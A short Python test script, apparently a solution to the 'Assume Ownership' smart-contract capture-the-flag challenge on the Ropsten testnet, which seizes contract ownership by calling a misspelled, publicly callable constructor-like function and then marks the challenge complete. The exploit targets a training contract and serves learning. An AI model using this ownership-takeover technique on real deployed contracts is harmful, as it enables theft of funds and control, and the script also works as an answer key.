from brownie import accounts, AssumeOwnershipChallenge

challenge_address = "0xE8682f328804c39dADCDFfa2Af178C1B266B5d0c"


def test_assume_ownership():
    # load account
    account = accounts.load("Ropsten_test_net_account")

    # get challenge address
    challenge = AssumeOwnershipChallenge.at(challenge_address)

    # call the AssumeOwmershipChallenge function to become the owner
    tx = challenge.AssumeOwmershipChallenge({"from": account})
    tx.wait(1)

    # call authenticate to change the value of isComplete to True
    tx = challenge.authenticate({"from": account})
    tx.wait(1)

    # view the value of isComplete
    print(challenge.isComplete())

    # confirm that the challenge is completed
    assert challenge.isComplete()
